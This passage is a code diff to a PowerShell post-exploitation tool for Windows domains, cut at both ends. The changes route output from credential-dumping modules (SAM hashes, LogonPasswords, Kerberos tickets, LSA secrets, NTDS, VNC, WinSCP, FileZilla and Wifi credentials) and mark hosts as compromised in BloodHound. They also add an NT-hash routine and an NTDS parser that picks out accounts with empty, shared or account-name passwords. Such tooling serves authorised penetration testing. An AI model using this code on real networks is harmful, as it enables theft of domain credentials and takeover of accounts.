                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
+                            #Write-Output ""
 
                             $filePath = switch ($Module) {
-                                "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
-                                "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
-                                "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
-                                "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
-                                "KerbDump" { "$Tickets\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
-                                "LSA" { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                                 "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
+                                "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
+                                "FileZilla" { "$FileZilla\$($runspace.ComputerName)-FileZilla.txt" }
                                 "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
+                                "KerbDump" { "$Tickets\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
+                                "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
+                                "LSA" { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                                 "NTDS" { "$NTDS\$($runspace.ComputerName)-NTDS.txt" }
+                                "Notepad" { "$Notepad\$($runspace.ComputerName)-Notepad.txt" }
+                                "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                                 "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
+                                "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
+                                "VNC" { "$VNCDump\$($runspace.ComputerName)-VNC.txt" }
+                                "Wifi" { "$Wifi\$($runspace.ComputerName)-Wifi.txt" }
+                                "WinSCP" { "$WinSCP\$($runspace.ComputerName)-WinSCP.txt" }
+
                                 default { $null }
                             }
 
@@ -3176,16 +3281,16 @@ while (`$true) {
                                 $result | Out-File -FilePath $filePath -Encoding "ASCII"
                         
                                 if ($ShowOutput) {
-                                    $result | Write-Host
-                                    Write-Host
+                                    $result | Write-Output
+                                    Write-Output ""
                                     $hasDisplayedResult = $true
                                 }
                             }
 
                             # Handle the default case.
                             if (-not $Module -and -not $hasDisplayedResult) {
-                                $result | Write-Host
-                                Write-Host
+                                $result | Write-Output
+                                Write-Output ""
                                 $hasDisplayedResult = $true
                             }
                         }
@@ -3195,6 +3300,7 @@ while (`$true) {
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
+                        Continue
                     }
 
                     # Dispose of runspace and close handle
@@ -4112,7 +4218,7 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                     elseif ($result -eq "Access Denied") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
                     } 
                     elseif ($result -eq "Unspecified Error") {
                         if ($successOnly) { continue }
@@ -4122,18 +4228,24 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                     elseif ($result -eq "Timed Out") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
                     }
             
                     elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
                     } 
 
                     elseif ($result -like "*Object reference not set to an instance of an object.*" -and $Module -eq "SCCM") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NOT SCCM CLIENT" -NameLength $NameLength -OSLength $OSLength
+                        Continue
+                    }
+
+                    elseif ($result -eq "No Results" -and $Module -eq "WinSCP") {
+                        if ($successOnly) { continue }
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                         Continue
                     }
                          
@@ -4142,32 +4254,40 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
+                        Continue
                     } 
 
                     elseif ($result -match "[a-zA-Z0-9]") {
                 
                         if ($result -eq "No Results") {
                             if ($successOnly) { continue }
-                            $Global:SuccessCount ++
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
+                            Continue
                         } 
                         else {
                             $Global:SuccessCount ++
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
+                            #Write-Output ""
 
                             $filePath = switch ($Module) {
-                                "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
-                                "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
-                                "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
-                                "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
-                                "KerbDump" { "$Tickets\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
-                                "LSA" { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                                 "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
+                                "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
+                                "FileZilla" { "$FileZilla\$($runspace.ComputerName)-FileZilla.txt" }
                                 "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
+                                "KerbDump" { "$Tickets\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
+                                "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
+                                "LSA" { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                                 "NTDS" { "$NTDS\$($runspace.ComputerName)-NTDS.txt" }
+                                "Notepad" { "$Notepad\$($runspace.ComputerName)-Notepad.txt" }
+                                "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                                 "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
+                                "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
+                                "VNC" { "$VNCDump\$($runspace.ComputerName)-VNC.txt" }
+                                "Wifi" { "$Wifi\$($runspace.ComputerName)-Wifi.txt" }
+                                "WinSCP" { "$WinSCP\$($runspace.ComputerName)-WinSCP.txt" }
+
                                 default { $null }
                             }
 
@@ -4175,16 +4295,16 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                                 $result | Out-File -FilePath $filePath -Encoding "ASCII"
                         
                                 if ($ShowOutput) {
-                                    $result | Write-Host
-                                    Write-Host
+                                    $result | Write-Output
+                                    Write-Output ""
                                     $hasDisplayedResult = $true
                                 }
                             }
 
                             # Handle the default case.
                             if (-not $Module -and -not $hasDisplayedResult) {
-                                $result | Write-Host
-                                Write-Host
+                                $result | Write-Output
+                                Write-Output ""
                                 $hasDisplayedResult = $true
                             }
                         }
@@ -4194,6 +4314,7 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
+                        Continue
                     }
 
                     # Dispose of runspace and close handle
@@ -4673,7 +4794,7 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                     elseif ($result -eq "Supported") {
                         $SuccessCount++
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "AUTH NOT REQUIRED" -NameLength $NameLength -OSLength $OSLength
-                        $ComputerName | Out-File -FilePath "$VNC\.VNC-Non-Auth.txt" -Encoding "ASCII" -Append
+                        $($runspace.ComputerName) | Out-File -FilePath "$VNC\.VNC-Non-Auth.txt" -Encoding "ASCII" -Append
                     } 
 
                     # Dispose of runspace and close handle
@@ -6044,6 +6165,148 @@ public class Advapi32 {
     }
 
     ################################################################################################################
+    ################################################# Function: ConvertTo-NT #######################################
+    ################################################################################################################
+
+    function ConvertTo-NT {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $true,
+            ValueFromPipeline = $true)]
+        [ValidateNotNull()]
+        [String]
+        $String
+    )
+
+    begin {
+        $Decoder = [System.Text.Encoding]::Unicode
+    }
+
+    process {
+        $Array = $Decoder.GetBytes($String)
+
+        $M = [System.Collections.ArrayList]@()
+        for ($i = 0; $i -le ($Array.count - 1); $i++) {
+            $null = $M.Add($Array[$i])
+        }
+
+        $null = $M.Add(0x80)
+        while ($M.count % 64 -ne 56) { $null = $M.Add(0) }
+        for ($i = 1; $i -le 8; $i++) { $null = $M.Add([int]0) }
+
+        [Byte[]]$M = $M
+        @([BitConverter]::GetBytes($Array.Count * 8)).CopyTo($M, $M.Count - 8)
+
+        $A = [Convert]::ToUInt32('0x67452301', 16)
+        $B = [Convert]::ToUInt32('0xefcdab89', 16)
+        $C = [Convert]::ToUInt32('0x98badcfe', 16)
+        $D = [Convert]::ToUInt32('0x10325476', 16)
+
+        if (-not ([System.Management.Automation.PSTypeName]"Shift").Type) {
+            Add-Type -TypeDefinition @'
+    public class Shift
+    {
+        public static uint Left(uint a, int b)
+        {
+            return ((a << b) | (((a >> 1) & 0x7fffffff) >> (32 - b - 1)));
+        }
+    }
+'@ | Out-Null
+        }
+
+
+        function FF([uint32]$X, [uint32]$Y, [uint32]$Z) {
+            (($X -band $Y) -bor ((-bnot $X) -band $Z))
+        }
+        function GG([uint32]$X, [uint32]$Y, [uint32]$Z) {
+            (($X -band $Y) -bor ($X -band $Z) -bor ($Y -band $Z))
+        }
+        function HH([uint32]$X, [uint32]$Y, [uint32]$Z) {
+            ($X -bxor $Y -bxor $Z)
+        }
+
+        for ($i = 0; $i -lt $M.Count; $i += 64) {
+            $AA = $A
+            $BB = $B
+            $CC = $C
+            $DD = $D
+
+            $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0)) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0)) -band [uint32]::MaxValue, 7)
+            $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0)) -band [uint32]::MaxValue, 11)
+            $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0)) -band [uint32]::MaxValue, 19)
+
+            $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0)) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0)) -band [uint32]::MaxValue, 7)
+            $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0)) -band [uint32]::MaxValue, 11)
+            $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0)) -band [uint32]::MaxValue, 19)
+
+            $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0)) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0)) -band [uint32]::MaxValue, 7)
+            $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0)) -band [uint32]::MaxValue, 11)
+            $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0)) -band [uint32]::MaxValue, 19)
+
+            $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0)) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0)) -band [uint32]::MaxValue, 7)
+            $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0)) -band [uint32]::MaxValue, 11)
+            $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0)) -band [uint32]::MaxValue, 19)
+
+            $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
+            $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
+            $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)
+
+            $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
+            $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
+            $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)
+
+            $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
+            $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
+            $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)
+
+            $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
+            $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
+            $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)
+
+            $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
+            $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
+            $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)
+
+            $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
+            $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
+            $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)
+
+            $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
+            $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
+            $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)
+
+            $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
+            $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
+            $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)
+
+            $A = ($A + $AA) -band [uint32]::MaxValue
+            $B = ($B + $BB) -band [uint32]::MaxValue
+            $C = ($C + $CC) -band [uint32]::MaxValue
+            $D = ($D + $DD) -band [uint32]::MaxValue
+        }
+
+        $A = ('{0:x8}' -f $A) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
+        $B = ('{0:x8}' -f $B) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
+        $C = ('{0:x8}' -f $C) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
+        $D = ('{0:x8}' -f $D) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
+
+        "$A$B$C$D"
+    }
+}
+
+    ################################################################################################################
     ################################################## Function: Parse-SAM #########################################
     ################################################################################################################
     function Parse-SAM {
@@ -6598,7 +6861,7 @@ public class Advapi32 {
                         # Assign a random variable name to each ticket path to help produce tidy output to console for command generation
                         if ($notes -match "TGT") {
                             do {
-                                $randomVarName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % { [char]$_ })
+                                $randomVarName = -join ((65..90) + (97..122) | Get-Random -Count 12 | % { [char]$_ })
                             } while (Get-Variable -Name $randomVarName -ErrorAction SilentlyContinue -Scope Global)
 
                             Set-Variable -Name $randomVarName -Value $filePath -Scope Global
@@ -6630,111 +6893,168 @@ public class Advapi32 {
     ############################################## Function: Parse-NTDS ############################################
     ################################################################################################################
 
-    Function Parse-NTDS {
-        param (
-            [string]$DirectoryPath
-        )
 
+function Invoke-NTDSParse {
+    param (
+        [string]$File,
+        [array]$EnabledDomainUsers
+    )
 
-        $AvailableMethods = "WMI", "WinRM", "SMB", "MSSQL", "SessionHunter"
+    $NTDSContent = Get-Content -Path $File
+
+    $userHashes = @()
+    $computerHashes = @()
+    $identicalPasswordGroups = @{}
+    $enabledIdenticalPasswordGroups = @{}  # New hashtable for enabled users
+    $enabledUserHashes = @()
+    $emptyPasswordUsers = @()
+    $enabledEmptyPasswordUsers = @()
+    $UsersWithAccountNameAsPassword = @()
+    $EnabledUsersWithAccountNameAsPassword = @()
+
+    foreach ($line in $NTDSContent) {
+        $parts = $line -split ':'
+        $user = $parts[0]
+        $hash = $parts[3]
+
+        if ($hash -eq '31d6cfe0d16ae931b73c59d7e0c089c0') {
+            $emptyPasswordUsers += $user
+            if ($EnabledDomainUsers -contains $user) {
+                $enabledEmptyPasswordUsers += $user
+            }
+        }
+
+        try {
+        $NTValue = ConvertTo-NT -String $user
+        if ($NTValue -eq $hash) {
+            $UsersWithAccountNameAsPassword += $user
+            if ($EnabledDomainUsers -contains $user) {
+                $EnabledUsersWithAccountNameAsPassword += $user
+                
+                }
+            }
+        } Catch {}
+
+        if ($user -like "*$*") {
+            $computerHashes += $line
+        }
+        else {
+            $userHashes += $line
+            if ($hash -ne $null) {
+                if (-not $identicalPasswordGroups.ContainsKey($hash)) {
+                    $identicalPasswordGroups[$hash] = @()
+                }
+                $identicalPasswordGroups[$hash] += $user
+
+                # Check if user is enabled and add to enabled identical password groups
+                if ($EnabledDomainUsers -contains $user) {
+                    if (-not $enabledIdenticalPasswordGroups.ContainsKey($hash)) {
+                        $enabledIdenticalPasswordGroups[$hash] = @()
+                    }
+                    $enabledIdenticalPasswordGroups[$hash] += $user
+                }
+            }
+
+            if ($EnabledDomainUsers -contains $user) {
+                $enabledUserHashes += $line
+            }
+        }
+    }
+
+    return @{
+        userHashes = $userHashes
+        enabledUserHashes = $enabledUserHashes
+        computerHashes = $computerHashes
+        emptyPasswordUsers = $emptyPasswordUsers
+        enabledEmptyPasswordUsers = $enabledEmptyPasswordUsers
+        identicalPasswordGroups = $identicalPasswordGroups
+        enabledIdenticalPasswordGroups = $enabledIdenticalPasswordGroups  # Return enabled identical password groups
+        UsersWithAccountNameAsPassword = $UsersWithAccountNameAsPassword
+        EnabledUsersWithAccountNameAsPassword = $EnabledUsersWithAccountNameAsPassword
+    }
+}
+
+function Parse-NTDS {
+
+        $AvailableMethods = "WMI", "WinRM", "SMB"
         if ($Method -notin $AvailableMethods) { return }
 
-        Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
-        Start-sleep -Seconds "2"
 
-        if ([string]::IsNullOrEmpty($DirectoryPath)) {
-            Write-Host "Directory path is not specified or is empty." -ForegroundColor Red
-            return
+    Write-Host "`nParsing Results" -ForegroundColor "Yellow"
+    Start-Sleep -Seconds 2
+    
+    $NTDSDirectory = $NTDS
+    $NTDS_Files = Get-ChildItem -Path $NTDSDirectory | Where-Object {$_.Name -Like "*.txt"} | Select-Object -ExpandProperty "FullName"
+
+    $searcher = New-Object DirectoryServices.DirectorySearcher
+    $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
+    $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
+    $users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
+    $EnabledDomainUsers = $users | ForEach-Object { $_.Properties["samAccountName"][0] }
+
+    foreach ($NTDS_File in $NTDS_Files) {
+        [string]$Date = @()
+        $Date += (Get-date).TimeOfDay.Hours
+        $Date += (Get-date).TimeOfDay.Minutes
+        $Date += (Get-date).TimeOfDay.Seconds
+
+        $results = Invoke-NTDSParse -File $NTDS_File -EnabledDomainUsers $EnabledDomainUsers
+        $fileBaseName = [IO.Path]::GetFileNameWithoutExtension($NTDS_File)
+        $outputDirectory = Join-Path $NTDSDirectory "${fileBaseName}_Parsed_${Date}"
+        $UserData = Join-Path $outputDirectory "User Data"
+        $ComputerData = Join-Path $outputDirectory "Computer Data"
+        $FullDump = Join-Path $outputDirectory "Full NTDS Dump"
+
+        if (-not (Test-Path -Path $outputDirectory)) {
+            New-Item -Path $outputDirectory -ItemType Directory | Out-Null
         }
 
-        if (-not (Test-Path -Path $DirectoryPath)) {
-            Write-Host "Directory at path '$DirectoryPath' does not exist." -ForegroundColor Red
-            return
+        if (-not (Test-Path -Path $UserData)) {
+            New-Item -Path $UserData -ItemType Directory | Out-Null
         }
 
-        $currentTime = Get-Date -Format "yyyyMMddHHmmss"
-        Get-ChildItem -Path $DirectoryPath -Filter "*-NTDS.txt" -File | ForEach-Object {
-            $NTDSFile = $_.FullName
-            $computerName = [IO.Path]::GetFileNameWithoutExtension($_.Name) -replace "-NTDS", ""
-            $newDirectoryName = "${computerName}-${currentTime}"
-            $newDirectoryPath = Join-Path $DirectoryPath $newDirectoryName
+        if (-not (Test-Path -Path $ComputerData)) {
+            New-Item -Path $ComputerData -ItemType Directory | Out-Null
+        }
 
-            if (-not (Test-Path -Path $newDirectoryPath)) {
-                New-Item -Path $newDirectoryPath -ItemType "Directory" | Out-Null
+        if (-not (Test-Path -Path $FullDump)) {
+            New-Item -Path $FullDump -ItemType Directory | Out-Null
+        }
+
+        $results.userHashes | Set-Content -Path (Join-Path $UserData  "1.All-User-Hashes.txt")
+        $results.enabledUserHashes | Set-Content -Path (Join-Path $UserData  "1.Enabled-User-Hashes.txt")
+        $results.computerHashes | Set-Content -Path (Join-Path $ComputerData "Computer-Hashes.txt") 
+        $results.enabledEmptyPasswordUsers | Set-Content -Path (Join-Path $UserData "2.Enabled-Users-With-Empty-Passwords.txt")
+        $results.emptyPasswordUsers | Set-Content -Path (Join-Path $UserData "2.All-Users-With-Empty-Passwords.txt")
+        $results.UsersWithAccountNameAsPassword | Set-Content -Path (Join-Path $UserData "3.All-Users-With-Password-As-Account-Name.txt")
+        $results.EnabledUsersWithAccountNameAsPassword | Set-Content -Path (Join-Path $UserData "3.Enabled-Users-With-Password-As-Account-Name.txt")
+
+        # Output for grouped users with identical passwords who are enabled
+        $groupNumber = 1
+        $groupedUsersContent = foreach ($group in $results.enabledIdenticalPasswordGroups.GetEnumerator()) {
+            if ($group.Value.Count -gt 1) {
+                Write-Output ""
+                $groupContent = "[Group $groupNumber]`n{0}" -f ($group.Value -join "`n")
+                $groupNumber++
+                $groupContent
             }
-
-            $userHashes = @()
-            $computerHashes = @()
-            $identicalPasswordGroups = @{}
-            $emptyPasswordUsers = @()
-            $samHashes = @()
-
-            $prevLine = ""
-            Get-Content $NTDSFile | ForEach-Object {
-                $line = $_
-                $parts = $line -split ':'
-                $user = $parts[0]
-                $hash = $parts[3]
-
-                if ($hash -eq '31d6cfe0d16ae931b73c59d7e0c089c0') {
-                    $emptyPasswordUsers += $user
-                }
-
-                if ($user -like "*$*") {
